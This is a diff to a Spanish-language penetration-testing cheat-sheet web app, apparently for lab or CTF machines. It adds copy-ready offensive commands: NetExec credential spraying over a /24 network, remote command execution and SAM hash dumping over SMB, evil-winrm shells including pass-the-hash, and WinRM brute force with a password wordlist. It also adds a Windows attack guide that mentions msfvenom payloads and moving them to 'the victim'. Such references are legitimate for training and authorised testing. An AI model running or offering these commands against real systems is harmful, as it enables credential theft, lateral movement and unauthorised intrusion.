@@ -291,7 +291,7 @@ const D = [
   ["discovery","Hosts vivos con ping del sistema","barrido rápido por si nmap no está a mano","for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i | grep 'bytes from'; done"],
 
   // ===== 2. Escaneo de puertos =====
-  ["scan","Escaneo completo (tu plantilla)","-p- los 65535 puertos, -sS SYN scan, -sC scripts por defecto, -sV versiones, -Pn sin ping previo","sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn {IP} -oN escaneo"],
+  ["scan","Escaneo completo","-p- los 65535 puertos, -sS SYN scan, -sC scripts por defecto, -sV versiones, -Pn sin ping previo","sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn {IP} -oN escaneo"],
   ["scan","Solo qué puertos están abiertos","escaneo rápido sin versiones para saber primero dónde mirar","nmap -p- --min-rate 5000 -T4 {IP} -oG puertos"],
   ["scan","Versiones y scripts en puertos concretos","-sVC lanza detección de versión y scripts solo sobre los puertos ya conocidos","nmap -p22,80,445 -sVC {IP} -oN versiones"],
   ["scan","Escaneo UDP de los más comunes","-sU escanea UDP; ve servicios que el escaneo TCP no detecta (SNMP, TFTP, DNS)","sudo nmap -sU --top-ports 100 {IP}"],
@@ -335,6 +335,16 @@ const D = [
   ["services","Descargar todo un share recursivo","-R con smbget baja la carpeta entera de golpe","smbget -R smb://{IP}/share"],
   ["services","Detección de SO por SMB (NSE)","smb-os-discovery saca versión de Windows y nombre de equipo por el 445","nmap -p445 --script smb-os-discovery {IP}"],
   ["services","Listar shares SMB con NSE","alternativa a smbclient usando los scripts de nmap","nmap -p445 --script smb-enum-shares {IP}"],
+  ["services","Comprobar acceso SMB con NetExec","nxc es el sucesor de crackmapexec (mismo uso); valida credenciales por SMB","nxc smb {IP} -u usuario -p 'password'"],
+  ["services","Rociar credenciales /24 con NetExec","prueba la credencial en toda la red; '(Pwn3d!)' marca dónde puedes ejecutar","nxc smb 10.10.10.0/24 -u usuario -p 'password'"],
+  ["services","Ejecutar un comando por SMB (NetExec)","-x lanza un comando si la credencial tiene permisos de admin","nxc smb {IP} -u usuario -p 'password' -x whoami"],
+  ["services","Volcar hashes SAM (NetExec)","--sam extrae los hashes locales si eres admin en el host","nxc smb {IP} -u usuario -p 'password' --sam"],
+
+  // ===== 6. WinRM (5985/5986) =====
+  ["winrm","Comprobar acceso WinRM","nxc valida si las credenciales sirven para WinRM; '(Pwn3d!)' = shell asegurada","nxc winrm {IP} -u usuario -p 'password'"],
+  ["winrm","Shell interactiva con evil-winrm","la forma estándar de conseguir consola en Windows por el 5985","evil-winrm -i {IP} -u usuario -p 'password'"],
+  ["winrm","evil-winrm con hash (pass-the-hash)","-H usa el hash NTLM en vez de la contraseña","evil-winrm -i {IP} -u usuario -H 'HASH_NTLM'"],
+  ["winrm","Fuerza bruta WinRM con NetExec","prueba una lista de contraseñas contra el servicio WinRM","nxc winrm {IP} -u usuario -p /usr/share/wordlists/rockyou.txt"],
 
   // ===== 6. FTP =====
   ["ftp","Login anónimo a FTP","muchos FTP permiten usuario 'anonymous' con cualquier contraseña","ftp {IP}"],
@@ -512,6 +522,7 @@ const META = {
   web:{n:"web",c:"var(--green)"},
   wordpress:{n:"wordpress",c:"var(--green)"},
   services:{n:"smb / servicios",c:"var(--green)"},
+  winrm:{n:"winrm",c:"var(--green)"},
   ftp:{n:"ftp",c:"var(--green)"},
   dns:{n:"dns",c:"var(--green)"},
   db:{n:"bases de datos",c:"var(--green)"},
@@ -580,7 +591,7 @@ ipEl.addEventListener("input",render);
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
@@ -690,7 +701,7 @@ const GUIDES = [
 
   ["📁","Encuentro SMB (445) o FTP (21)","services",[
     "<b>FTP:</b> prueba login anónimo (<code>ftp IP</code>, usuario anonymous). Si entras, descárgate todo.",
-    "<b>SMB sin credenciales:</b> lista shares con <code>smbclient -L //IP/ -N</code> y <code>crackmapexec smb IP</code>.",
+    "<b>SMB sin credenciales:</b> lista shares con <code>smbclient -L //IP/ -N</code> y <code>nxc smb IP</code> (NetExec, sucesor de crackmapexec).",
     "Enumera a fondo: <code>enum4linux -a IP</code> (usuarios, grupos, políticas).",
     "Conéctate a los shares accesibles y descarga configs, backups y notas.",
     "Si sacas credenciales, pruébalas contra SMB por toda la red (reutilización).",
@@ -785,13 +796,14 @@ const GUIDES = [
   [["shell","Ya entré por SSH"]]],
 
   ["🪟","La máquina es Windows","winpriv",[
-    "Enumera SMB (445): <code>crackmapexec smb IP</code>, <code>enum4linux -a IP</code>, NSE <code>smb-os-discovery</code>.",
-    "Prueba credenciales por SMB y, si valen, ejecuta comandos (<code>crackmapexec smb IP -u X -p Y -x whoami</code>).",
+    "Enumera SMB (445): <code>nxc smb IP</code> (NetExec), <code>enum4linux -a IP</code>, NSE <code>smb-os-discovery</code>.",
+    "Prueba credenciales por SMB con NetExec; si sale <b>(Pwn3d!)</b> puedes ejecutar comandos (<code>nxc smb IP -u X -p Y -x whoami</code>).",
+    "Si el <b>WinRM (5985)</b> acepta las credenciales, consigue shell con <code>evil-winrm -i IP -u X -p Y</code>.",
     "Si hay RDP (3389): <code>xfreerdp /u:usuario /p:pass /v:IP</code>.",
-    "Shell: genera payload con <code>msfvenom -p windows/... -f exe</code> y pásalo con certutil o PowerShell.",
+    "Sin shell aún: genera payload con <code>msfvenom -p windows/... -f exe</code> y pásalo con certutil o PowerShell.",
     "Escalada: <code>whoami /priv</code> (SeImpersonate → Potato), <code>systeminfo</code> para exploits, y WinPEAS.",
-  ],"SeImpersonatePrivilege activo suele significar escalada directa a SYSTEM con un Potato attack.",
-  [["transfer","Pasar el payload a la víctima"]]],
+  ],"Con credenciales válidas, WinRM (evil-winrm) es la vía más limpia para tener consola en Windows.",
+  [["winrm","Ver comandos de WinRM/NetExec"],["transfer","Pasar el payload a la víctima"]]],
 
   ["📤","Cómo paso archivos a la víctima","transfer",[
     "En tu Kali, sirve la carpeta: <code>python3 -m http.server 8000</code>.",
